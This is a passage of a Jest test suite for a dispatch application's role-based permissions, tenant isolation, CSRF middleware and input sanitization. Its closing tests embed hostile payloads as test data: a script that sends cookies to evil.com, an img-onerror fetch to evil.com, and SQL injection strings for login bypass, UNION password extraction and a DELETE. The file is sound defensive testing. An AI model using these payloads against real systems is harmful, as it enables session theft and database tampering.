      requirePermission("trips", "write")(req, res, next);
      expect(res.statusCode).toBe(403);
    });

    it("should deny DRIVER from reading dashboard", () => {
      const req = mockReq({ user: { userId: 3, role: "DRIVER" } });
      const res = mockRes();
      const next = mockNext();
      requirePermission("dashboard", "read")(req, res, next);
      expect(res.statusCode).toBe(403);
    });

    it("should allow CLINIC_USER to write trips", () => {
      const req = mockReq({ user: { userId: 4, role: "CLINIC_USER" } });
      const res = mockRes();
      const next = mockNext();
      requirePermission("trips", "write")(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should deny BROKER_USER from writing broker_contracts", () => {
      const req = mockReq({ user: { userId: 5, role: "BROKER_USER" } });
      const res = mockRes();
      const next = mockNext();
      requirePermission("broker_contracts", "write")(req, res, next);
      expect(res.statusCode).toBe(403);
    });
  });

  describe("opsRouteGuard", () => {
    it("should return 401 when no user is set", () => {
      const req = mockReq();
      const res = mockRes();
      const next = mockNext();
      opsRouteGuard(req, res, next);
      expect(res.statusCode).toBe(401);
    });

    it("should deny DRIVER role", () => {
      const req = mockReq({ user: { userId: 1, role: "DRIVER" } });
      const res = mockRes();
      const next = mockNext();
      opsRouteGuard(req, res, next);
      expect(res.statusCode).toBe(403);
    });

    it("should allow ADMIN role", () => {
      const req = mockReq({ user: { userId: 2, role: "ADMIN" } });
      const res = mockRes();
      const next = mockNext();
      opsRouteGuard(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should allow DISPATCH role", () => {
      const req = mockReq({ user: { userId: 3, role: "DISPATCH" } });
      const res = mockRes();
      const next = mockNext();
      opsRouteGuard(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should allow VIEWER role (not in OPS_DENIED_ROLES)", () => {
      const req = mockReq({ user: { userId: 4, role: "VIEWER" } });
      const res = mockRes();
      const next = mockNext();
      opsRouteGuard(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });

  describe("isDispatchLevel", () => {
    it("should return true for SUPER_ADMIN, ADMIN, COMPANY_ADMIN, DISPATCH", () => {
      expect(isDispatchLevel("SUPER_ADMIN")).toBe(true);
      expect(isDispatchLevel("ADMIN")).toBe(true);
      expect(isDispatchLevel("COMPANY_ADMIN")).toBe(true);
      expect(isDispatchLevel("DISPATCH")).toBe(true);
    });

    it("should return false for non-dispatch roles", () => {
      expect(isDispatchLevel("DRIVER")).toBe(false);
      expect(isDispatchLevel("VIEWER")).toBe(false);
      expect(isDispatchLevel("CLINIC_ADMIN")).toBe(false);
      expect(isDispatchLevel("BROKER_ADMIN")).toBe(false);
      expect(isDispatchLevel("PHARMACY_ADMIN")).toBe(false);
    });
  });

  describe("isCompanyScoped", () => {
    it("should return true for COMPANY_ADMIN with companyId", () => {
      expect(isCompanyScoped({ userId: 1, role: "COMPANY_ADMIN", companyId: 5 })).toBe(true);
    });

    it("should return false for COMPANY_ADMIN without companyId", () => {
      expect(isCompanyScoped({ userId: 1, role: "COMPANY_ADMIN", companyId: null })).toBe(false);
      expect(isCompanyScoped({ userId: 1, role: "COMPANY_ADMIN" })).toBe(false);
    });

    it("should return false for non-COMPANY_ADMIN roles even with companyId", () => {
      expect(isCompanyScoped({ userId: 1, role: "ADMIN", companyId: 5 })).toBe(false);
      expect(isCompanyScoped({ userId: 1, role: "DISPATCH", companyId: 5 })).toBe(false);
    });
  });

  describe("csrfProtection patterns", () => {
    it("should skip CSRF for GET requests", () => {
      const req = mockReq({ method: "GET" });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for HEAD requests", () => {
      const req = mockReq({ method: "HEAD" });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for OPTIONS requests", () => {
      const req = mockReq({ method: "OPTIONS" });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for Bearer-only auth (no cookie)", () => {
      const req = mockReq({
        method: "POST",
        headers: { authorization: "Bearer some-token" },
        cookies: {},
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for webhook paths", () => {
      // csrfProtection is mounted at /api, so req.path won't include /api prefix
      const req = mockReq({
        method: "POST",
        path: "/stripe/webhook",
        cookies: { ucm_access: "token" },
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for login endpoints", () => {
      const req = mockReq({
        method: "POST",
        path: "/auth/login",
        cookies: {},
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for public API paths", () => {
      const req = mockReq({
        method: "POST",
        path: "/public/something",
        cookies: { ucm_access: "token" },
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should reject POST with cookie auth but no CSRF token", () => {
      const req = mockReq({
        method: "POST",
        path: "/trips",
        cookies: { ucm_access: "some-token" },
        headers: {},
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(res.statusCode).toBe(403);
      expect(res.body.code).toBe("CSRF_INVALID");
    });

    it("should reject POST with mismatched CSRF cookie and header", () => {
      const req = mockReq({
        method: "POST",
        path: "/trips",
        cookies: { ucm_access: "token", ucm_csrf: "csrf-cookie-value" },
        headers: { "x-csrf-token": "different-value" },
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(res.statusCode).toBe(403);
      expect(res.body.code).toBe("CSRF_INVALID");
    });

    it("should allow POST with matching CSRF cookie and header", () => {
      const csrfValue = "matching-csrf-token";
      const req = mockReq({
        method: "POST",
        path: "/trips",
        cookies: { ucm_access: "token", ucm_csrf: csrfValue },
        headers: { "x-csrf-token": csrfValue },
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should enforce CSRF on PUT, PATCH, DELETE methods", () => {
      for (const method of ["PUT", "PATCH", "DELETE"]) {
        const req = mockReq({
          method,
          path: "/trips/1",
          cookies: { ucm_access: "token" },
          headers: {},
        });
        const res = mockRes();
        const next = mockNext();
        csrfProtection(req, res, next);
        expect(res.statusCode).toBe(403);
        expect(next).not.toHaveBeenCalled();
      }
    });

    it("should skip CSRF for broker API v1 path", () => {
      const req = mockReq({
        method: "POST",
        path: "/broker-api/v1/trips",
        cookies: { ucm_access: "token" },
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for token-login endpoint", () => {
      const req = mockReq({
        method: "POST",
        path: "/auth/token-login",
        cookies: {},
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for forgot-password endpoint", () => {
      const req = mockReq({
        method: "POST",
        path: "/auth/forgot-password",
        cookies: {},
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for refresh endpoint", () => {
      const req = mockReq({
        method: "POST",
        path: "/auth/refresh",
        cookies: {},
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });

    it("should skip CSRF for logout endpoint", () => {
      const req = mockReq({
        method: "POST",
        path: "/auth/logout",
        cookies: { ucm_access: "token" },
      });
      const res = mockRes();
      const next = mockNext();
      csrfProtection(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// 6. Cross-cutting Security Concerns
// ═══════════════════════════════════════════════════════════════════

describe("Cross-cutting Security Concerns", () => {
  describe("Privilege escalation prevention", () => {
    it("DRIVER should not be able to access admin resources", () => {
      const adminResources: Resource[] = ["users", "cities", "payroll", "invoices"];
      for (const r of adminResources) {
        expect(can("DRIVER", r, "read")).toBe(false);
        expect(can("DRIVER", r, "write")).toBe(false);
      }
    });

    it("CLINIC_USER should not be able to manage users", () => {
      expect(can("CLINIC_USER", "users", "read")).toBe(false);
      expect(can("CLINIC_USER", "users", "write")).toBe(false);
    });

    it("BROKER_USER should not be able to write broker_contracts", () => {
      expect(can("BROKER_USER", "broker_contracts", "write")).toBe(false);
    });

    it("PHARMACY_USER should not be able to manage users or billing", () => {
      expect(can("PHARMACY_USER", "users", "read")).toBe(false);
      expect(can("PHARMACY_USER", "users", "write")).toBe(false);
      expect(can("PHARMACY_USER", "billing", "read")).toBe(false);
    });

    it("VIEWER should not have write permission on any resource", () => {
      for (const r of ALL_RESOURCES) {
        expect(can("VIEWER", r, "write")).toBe(false);
      }
    });

    it("CLINIC_VIEWER should not have write permission on any resource", () => {
      for (const r of ALL_RESOURCES) {
        expect(can("CLINIC_VIEWER", r, "write")).toBe(false);
      }
    });
  });

  describe("Tenant isolation via portal roles", () => {
    it("clinic roles should not access broker or pharmacy resources", () => {
      const clinicRoles: AppRole[] = ["CLINIC_ADMIN", "CLINIC_USER", "CLINIC_VIEWER"];
      for (const role of clinicRoles) {
        expect(can(role, "broker_marketplace", "read")).toBe(false);
        expect(can(role, "broker_contracts", "read")).toBe(false);
        expect(can(role, "pharmacy_orders", "read")).toBe(false);
      }
    });

    it("broker roles should not access pharmacy resources", () => {
      expect(can("BROKER_ADMIN", "pharmacy_orders", "read")).toBe(false);
      expect(can("BROKER_USER", "pharmacy_orders", "read")).toBe(false);
    });

    it("pharmacy roles should not access broker-specific resources", () => {
      expect(can("PHARMACY_ADMIN", "broker_marketplace", "read")).toBe(false);
      expect(can("PHARMACY_ADMIN", "broker_contracts", "read")).toBe(false);
      expect(can("PHARMACY_USER", "broker_marketplace", "read")).toBe(false);
    });
  });

  describe("Sanitization prevents stored XSS", () => {
    it("should neutralize script injection in user inputs", () => {
      const malicious = '<script>document.location="http://evil.com?c="+document.cookie</script>';
      const sanitized = sanitizeString(malicious);
      expect(sanitized).not.toContain("<script");
      expect(containsXss(sanitized)).toBe(false);
    });

    it("should neutralize img onerror injection", () => {
      const input = '<img src=x onerror="fetch(\'http://evil.com\')"/>';
      const sanitized = sanitizeString(input);
      expect(sanitized).not.toContain("<img");
    });
  });

  describe("Combined sanitization + SQL injection", () => {
    it("should detect tautology-based login bypass", () => {
      expect(containsSqli("' OR 1=1 --")).toBe(true);
    });

    it("should detect UNION-based data exfiltration", () => {
      expect(containsSqli("1 UNION SELECT username, password FROM users")).toBe(true);
    });

    it("should detect batch statement injection", () => {
      expect(containsSqli("'; DELETE FROM trips WHERE 1=1 --")).toBe(true);
    });
  });
});
